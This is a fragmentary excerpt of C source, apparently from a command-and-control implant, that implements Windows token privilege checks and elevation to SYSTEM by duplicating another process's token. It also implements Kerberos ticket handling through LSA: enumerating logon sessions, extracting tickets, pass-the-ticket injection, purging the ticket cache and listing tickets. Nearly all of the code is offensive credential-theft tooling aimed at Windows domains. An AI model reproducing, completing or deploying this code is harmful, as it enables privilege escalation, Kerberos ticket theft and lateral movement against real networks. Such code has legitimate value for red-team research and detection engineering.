...
BOOL IsHighIntegrity(HANDLE TokenHandle)
{
    ...
    Success = ((INSTANCE *)Instance)->Win32.AllocateAndInitializeSid( &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup );
    if ( Success )
    {
        if ( ! ((INSTANCE *)Instance)->Win32.CheckTokenMembership( NULL, AdministratorsGroup, &ReturnValue ) )
        {
            ReturnValue = FALSE;
        }
        ((INSTANCE *)Instance)->Win32.FreeSid( AdministratorsGroup );
...
DWORD GetProcessIdByName(WCHAR* processName)
{
    ...
    hProcessSnap = ((INSTANCE *)Instance)->Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.Process32FirstW( hProcessSnap, &pe32 ) )
    {
    ...
    } while (((INSTANCE *)Instance)->Win32.Process32NextW(hProcessSnap, &pe32));
...
BOOL ElevateToSystem()
{
    ...
    if ( hProcess )
    {
        if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
        {
            ...
            {
                PRINTF( "TokenDuplicate: Failed [%d]\n", ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) )
            }
            SysNtClose( hToken );
        }
        else
...
BOOL IsSystem( HANDLE TokenHandle )
{
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser ) )
    {
        return FALSE;
    }

    if ( ! ((INSTANCE *)Instance)->Win32.AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid) )
        return FALSE;

    bSystem = ((INSTANCE *)Instance)->Win32.EqualSid( pTokenUser->User.Sid, pSystemSid );
    ((INSTANCE *)Instance)->Win32.FreeSid( pSystemSid );
...
NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
{
    ...
    if ( ! highIntegrity )
    {
        status = ((INSTANCE *)Instance)->Win32.LsaConnectUntrusted( &hLsaLocal );
        if ( ! NT_SUCCESS( status ) )
        {
            status = ((INSTANCE *)Instance)->Win32.LsaNtStatusToWinError( status );
        }
    }
    else
    {
        ...
        status = ((INSTANCE *)Instance)->Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
...
NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
{
    ...
    sessionData = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( LOGON_SESSION_DATA ) );
    if ( ! sessionData )
        return status;

    if ( luid.LowPart != 0 )
    {
        status = ((INSTANCE *)Instance)->Win32.LsaGetLogonSessionData( &luid, &logonData );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof(*sessionData->sessionData) );
    ...
    else
    {
        ...
        status = ((INSTANCE *)Instance)->Win32.LsaEnumerateLogonSessions( &logonSessionCount, &logonSessionList );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, logonSessionCount * sizeof(*sessionData->sessionData) );
            if ( sessionData->sessionData != NULL )
            {
                ...
                for ( int i = 0; i < logonSessionCount; i++ )
                {
                    ...
                    status = ((INSTANCE *)Instance)->Win32.LsaGetLogonSessionData( &luid2, &logonData );
                    if ( NT_SUCCESS(status) )
                    {
                ...
                ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer( logonSessionList );
                *data = sessionData;
            }
            else
            {
...
VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PUINT32 ticketSize )
{
    ...
    retrieveRequest = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
    if ( ! retrieveRequest )
        return;
    ...
    status = ((INSTANCE *)Instance)->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, (LPVOID*)&retrieveResponse, &responseSize, &protocolStatus );
    if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
    {
        if ( NT_SUCCESS( protocolStatus ) )
        {
            TicketSize = retrieveResponse->Ticket.EncodedTicketSize;
            Ticket = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, TicketSize );
            if ( Ticket )
            {
    ...
    if ( retrieveResponse )
        ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer( retrieveResponse );
    if ( retrieveRequest )
        ((INSTANCE *)Instance)->Win32.LocalFree( retrieveRequest );
}
...
VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )
{
    ...
    // UserSID
    WCHAR* sid = NULL;
    if ( ((INSTANCE *)Instance)->Win32.ConvertSidToStringSidW(Data->Sid, &sid) )
    {
        StringCopyW( Session->UserSID, sid );
        ((INSTANCE *)Instance)->Win32.LocalFree( sid ); sid = NULL;
    }
    // LogonTime
...
BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
{
    ...
    status = ((INSTANCE *)Instance)->Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
    if ( ! NT_SUCCESS( status ) )
    {
    ...
    submitRequest = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
    if ( ! submitRequest )
        goto END;
    ...
    status = ((INSTANCE *)Instance)->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus );
...
END:
    if ( submitRequest ) {
        ((INSTANCE *)Instance)->Win32.LocalFree( submitRequest );
    }
    if ( hLsa ) {
        ((INSTANCE *)Instance)->Win32.LsaDeregisterLogonProcess( hLsa );
    }
    MemZero( name, sizeof( name ) );
...
BOOL Purge( HANDLE hToken, LUID luid )
{
    ...
    status = ((INSTANCE *)Instance)->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &purgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &purgeResponse, &responseSize, &protocolStatus );

    if ( purgeResponse )
    {
        ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer( purgeResponse ); purgeResponse = NULL;
    }
...
PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
{
    ...
    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", ((INSTANCE *)Instance)->Win32.LsaNtStatusToWinError( status ) );
        goto END;
    }
    ...
    for ( int i = 0; i < sessionData->sessionCount; i++ )
    {
        ...
        NewSession = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( SESSION_INFORMATION ) );
        if ( ! NewSession )
            continue;
        ...
        ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );

        cacheResponse = NULL;
        status = ((INSTANCE *)Instance)->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), (LPVOID*)&cacheResponse, &responseSize, &protocolStatus );
        if ( ! NT_SUCCESS( status ) )
        {
        ...
        {
            TicketInfo = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( TICKET_INFORMATION ) );
            if ( ! TicketInfo )
                continue;
        ...
        ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
    }
...
END:
    if ( sessionData && sessionData->sessionData ) {
        ((INSTANCE *)Instance)->Win32.LocalFree( sessionData->sessionData );
    }
    if ( sessionData ) {
        ((INSTANCE *)Instance)->Win32.LocalFree( sessionData );
    }
    if ( hLsa ) {
        ((INSTANCE *)Instance)->Win32.LsaDeregisterLogonProcess( hLsa );
    }
...
LUID* GetLUID( HANDLE hToken )
{
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenStatistics, &tokenStats, sizeof( tokenStats ), &tokenSize ) )
        return NULL;

    luid = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( LUID ) );
    if ( ! luid )
        return NULL;
